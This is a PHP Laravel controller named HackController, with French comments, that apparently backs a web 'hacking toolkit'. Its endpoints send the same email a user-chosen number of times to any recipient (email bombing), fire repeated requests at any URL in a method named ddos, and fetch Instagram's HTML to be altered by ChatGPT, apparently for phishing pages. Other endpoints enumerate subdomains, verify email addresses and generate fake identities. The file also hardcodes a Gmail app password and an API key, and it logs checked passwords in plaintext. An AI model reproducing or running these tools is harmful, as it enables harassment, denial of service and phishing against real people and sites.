<?php

namespace App\Http\Controllers;

use HttpRequest;
use App\Models\Log;
use GuzzleHttp\Client;
use Illuminate\Http\Request;
use PHPMailer\PHPMailer\Exception;
use PHPMailer\PHPMailer\PHPMailer;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Http;
use GuzzleHttp\Exception\RequestException;
use Symfony\Component\HttpKernel\Exception\HttpException;
use Faker\Factory as Faker;
use App\Http\Controllers\Controller;


class HackController extends Controller
{
    public function emailChecker($email)
    {
        $user = Auth::user();
    
        if (!$user) {
            return response()->json(['error' => 'Utilisateur non authentifié'], 401);
        }
    
        try {
            $client = new Client();
            $url = 'https://api.hunter.io/v2/email-verifier?email=' . $email . '&api_key=a408bf05f8c0b21d39120be64204a5265b1db4a6';
    
            // Valider le format de l'email avant d'envoyer la requête
            if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
                return response()->json(['error' => 'Adresse email invalide'], 400);
            }
    
            // Envoyer la requête GET à l'API Hunter.io
            $response = $client->request('GET', $url);
    
            // Vérifier si la réponse est correcte (statut 200)
            if ($response->getStatusCode() !== 200) {
                return response()->json(['error' => 'Erreur de l\'API Hunter: ' . $response->getStatusCode()], 500);
            }
    
            // Décoder la réponse JSON
            $data = json_decode($response->getBody(), true);
    
            if (isset($data['errors'])) {
                // Gérer les erreurs spécifiques de l'API Hunter.io
                return response()->json(['error' => 'Erreur API Hunter: ' . $data['errors'][0]['details']], 400);
            }
    
            // Extraire les informations nécessaires
            $result = [
                'email' => $data['data']['email'] ?? null,
                'score' => isset($data['data']['score']) ? $data['data']['score'] . '%' : null,
                'status' => $data['data']['status'] ?? null,
            ];
    
            // Enregistrer le log de l'utilisateur
            try {
                Log::create([
                    'utilisateur_id' => $user->id,
                    'fonctionnalite_id' => 4, // ID de la fonctionnalité
                    'description_action' => "email Check on :" . $data['data']['email']
                ]);
            } catch (\Exception $e) {
                return response()->json(['error' => 'Erreur lors de l\'enregistrement du log: ' . $e->getMessage()], 500);
            }
    
            // Retourner les informations extraites
            return response()->json($result);   
    
        } catch (RequestException $e) {
            if ($e->hasResponse()) {
                // Gérer les erreurs HTTP spécifiques
                $statusCode = $e->getResponse()->getStatusCode();
                $errorMessage = $e->getResponse()->getBody()->getContents();
                return response()->json(['error' => 'Erreur API Hunter: ' . $statusCode . ' - ' . $errorMessage], $statusCode);
            }
    
            // Autres erreurs de requête
            return response()->json(['error' => 'Erreur de connexion à l\'API: ' . $e->getMessage()], 500);
        } catch (\Exception $e) {
            return response()->json(['error' => 'Erreur inattendue: ' . $e->getMessage()], 500);
        }
    }
    

    function envoyerEmail(Request $request) {

        $user = Auth::user();
    
        if (!$user) {
            // Si l'utilisateur n'est pas authentifié, renvoyer une réponse avec une erreur 401
            return response()->json(['error' => 'Utilisateur non authentifié'], 401);
        }

        try{

        } catch (\Exception $e) {
            // Gérer les erreurs liées à la création du log
            return response()->json(['error' => 'Erreur lors de l\'enregistrement du log: ' . $e->getMessage()], 500);
        }

        $mail = new PHPMailer(true);
        try {
            // Configuration du serveur SMTP
            $mail->isSMTP();
            $mail->Host       = 'smtp.gmail.com';          // Serveur SMTP Gmail
            $mail->SMTPAuth   = true;
            $mail->Username   = 'berthet.robinson@gmail.com';   // Ton adresse Gmail
            $mail->Password   = 'qtsi ypwe sfph jbbb';        // Ton mot de passe ou App Password
            $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
            $mail->Port       = 587;                       // Port TLS pour Gmail
    
            // Destinataire
            $mail->setFrom('berthet.robinson@gmail.com', 'robi');  // Adresse email et nom de l'expéditeur
            $mail->addAddress($request->destinataire);                    // Ajouter un destinataire
    
            // Contenu de l'email
            $mail->isHTML(true);                                 // Format HTML
            $mail->Subject = $request->objet;                             // Sujet de l'email
            $mail->Body    = $request->message;                           // Contenu du message
            
            for($i= 0; $i < $request->nombreEmail; $i++)
            {
                // Envoi de l'email
                $mail->send();

            }

            Log::create([
                'utilisateur_id' => $user->id,  // ID de l'utilisateur connecté
                'fonctionnalite_id' => 5,       // ID de la fonctionnalité (connexion)
                'description_action' => "envoi de ".$request->nombreEmail." email(s) à ".$request->destinataire  // Description de l'action
            ]);

            return true;
        } catch (Exception $e) {
            // En cas d'erreur
            echo "L'email n'a pas pu être envoyé. Erreur: {$mail->ErrorInfo}";
            return false;
        }
    }
    
    public function checkPassword(Request $request)
    {
        // Vérifier que l'utilisateur est authentifié
        $user = Auth::user();

        if (!$user) {
            return response()->json(['error' => 'Utilisateur non authentifié'], 401);
        }

        // Valider que la requête a bien un paramètre 'password'
        $request->validate([
            'password' => 'required|string',
        ]);

        // Récupérer le mot de passe depuis la requête
        $password = $request->password;

        // URL du fichier texte brut sur GitHub
        $url = 'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10k-most-common.txt';

        try {
            // Récupérer le contenu du fichier
            $response = Http::get($url);

            if ($response->failed()) {
                return response()->json(['error' => 'Erreur lors de la récupération du fichier'], 500);
            }

            // Contenu du fichier texte
            $fileContent = $response->body();

            // Découper le contenu du fichier en un tableau de mots (chaque mot sur une ligne)
            $passwordsList = explode("\n", $fileContent);

            // Vérifier si le mot de passe existe dans la liste
            $isPasswordInList = in_array(trim($password), array_map('trim', $passwordsList));

            Log::create([
                'utilisateur_id' => $user->id,  // ID de l'utilisateur connecté
                'fonctionnalite_id' => 7,       // ID de la fonctionnalité (connexion)
                'description_action' => "password checking sur le pwd :".$request->password
            ]);

            // Retourner une réponse JSON avec 'true' ou 'false'
            return response()->json(['exists' => $isPasswordInList]);

        } catch (\Exception $e) {
            // Gérer les erreurs inattendues
            return response()->json(['error' => 'Erreur inattendue: ' . $e->getMessage()], 500);
        }
    }

    public function modifyHtml()
    {
        // URL de la page à récupérer
        $url = 'https://www.instagram.com'; // Mettez l'URL désirée ici

        // Créez un client Guzzle
        $client = new Client();

        // Étape 1 : Récupérer le HTML de la page
        try {
            $response = $client->request('GET', $url);
            $html = $response->getBody()->getContents();
        } catch (\Exception $e) {
            return response()->json(['error' => 'Erreur lors de la récupération de la page'], 500);
        }

        // Étape 2 : Modifier le HTML avec l'API de ChatGPT
        $chatGptApiKey = env('CHATGPT_API_KEY'); // Assurez-vous d'avoir cette clé dans votre fichier .env

        $client = new Client();

        try {
            $response = $client->post('https://api.openai.com/v1/chat/completions', [
                'headers' => [
                    'Authorization' => 'Bearer ' . $chatGptApiKey,
                    'Content-Type' => 'application/json',
                ],
                'json' => [
                    'model' => 'gpt-3.5-turbo', // Vous pouvez changer le modèle si nécessaire
                    'messages' => [
                        ['role' => 'user', 'content' => "Voici le HTML de la page Instagram : $html. Modifie-le selon mes spécifications."],
                    ],
                ],
            ]);

            $result = json_decode($response->getBody(), true);
            $modifiedHtml = $result['choices'][0]['message']['content'] ?? 'Aucun contenu modifié';
        } catch (\Exception $e) {
            return response()->json(['error' => 'Erreur lors de l\'appel à l\'API ChatGPT'], 500);
        }

        // Étape 3 : Retourner le HTML modifié
        return response()->json(['modified_html' => $modifiedHtml]);
    }

    public function generatePassword()
    {

        $password = substr(str_shuffle('0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()_+{}|:<>?'), 0, 16);

        // Enregistrer le log de l'utilisateur
        $user = Auth::user();

        if (!$user) {
            return response()->json(['error' => 'Utilisateur non authentifié'], 401);
        }

        try {
            Log::create([
                'utilisateur_id' => $user->id,
                'fonctionnalite_id' => 8, // ID de la fonctionnalité
                'description_action' => "Génération d'un mot de passe aléatoire"
            ]);
        } catch (\Exception $e) {
            return response()->json(['error' => 'Erreur lors de l\'enregistrement du log: ' . $e->getMessage()], 500);
        }

        // Retourner le mot de passe généré
        return response()->json(['password' => $password]);
    }
    
    
    public function getSubdomains($domain)
    {
        // Définis ta clé d'API SecurityTrails ici ou dans le fichier .env
        $apiKey = env('SECURITYTRAILS_API_KEY');

        $user = Auth::user();

        if (!$user) {
            return response()->json(['error' => 'Utilisateur non authentifié'], 401);
        }

        // return response()->json($apiKey);

        // L'URL de l'API pour récupérer les sous-domaines
        $url = "https://api.securitytrails.com/v1/domain/{$domain}/subdomains";

        // Effectue la requête GET
        $response = Http::withHeaders([
            'APIKEY' => $apiKey 
        ])->get($url);


        // Vérifie si la requête a réussi
        if ($response->successful()) {

            try {
                Log::create([
                    'utilisateur_id' => $user->id,
                    'fonctionnalite_id' => 9, // ID de la fonctionnalité
                    'description_action' => "recuperation des sous-domaines de :".$domain
                ]);
            } catch (\Exception $e) {
                return response()->json(['error' => 'Erreur lors de l\'enregistrement du log: ' . $e->getMessage()], 500);
            }

            // Récupère et retourne les sous-domaines en JSON
            return response()->json($response->json());
        }

        // Gère les erreurs en cas de problème
        return response()->json([
            'error' => 'Impossible de récupérer les sous-domaines.'
        ], $response->status());
    }

    public function ddos(Request $request)
    {

        $user = Auth::user();

        if (!$user) {
            return response()->json(['error' => 'Utilisateur non authentifié'], 401);
        }
        // Valider les données d'entrée
        $request->validate([
            'url' => 'required|url', // Vérifie que l'URL est valide
            'count' => 'required|integer|min:1', // Vérifie que count est un entier positif
        ]);

        $url = $request->input('url');
        $count = $request->input('count');
        $responses = [];

        try {
            Log::create([
                'utilisateur_id' => $user->id,
                'fonctionnalite_id' => 11, // ID de la fonctionnalité
                'description_action' => "attaque ddos sur :".$url." avec ".$count." requêtes"
            ]);
        } catch (\Exception $e) {
            return response()->json(['error' => 'Error saving log: ' . $e->getMessage()], 500);
        }

        // Envoie les requêtes en boucle
        for ($i = 0; $i < $count; $i++) {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            $output = curl_exec($ch);
            $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            curl_close($ch);

            // Enregistre la réponse ou le code HTTP
            $responses[] = [
                'request_number' => $i + 1,
                'http_code' => $httpCode,
                'response' => $output,
            ];
        }

        return response()->json($responses);
    }

    public function generateIdentity()
    {
        // Récupérer l'utilisateur authentifié
        $user = Auth::user();

        if (!$user) {
            return response()->json(['error' => 'Utilisateur non authentifié'], 401);
        }
        // Créer une instance de Faker
        $faker = Faker::create();

        // Générer une identité fictive
        $fakeIdentity = [
            'name' => $faker->name,
            'email' => $faker->email,
            'address' => $faker->address,
            'phone' => $faker->phoneNumber,
        ];

        // Enregistrer l'action dans les logs
        try {
            Log::create([
                'utilisateur_id' => $user->id,
                'fonctionnalite_id' => 10, // ID de la fonctionnalité
                'description_action' => "generation d'une identité fictive : ".$fakeIdentity['name']
            ]);
        } catch (\Exception $e) {
            return response()->json(['error' => 'Error saving log: ' . $e->getMessage()], 500);
        }
        // Retourner la réponse JSON
        return response()->json($fakeIdentity);
    }
}
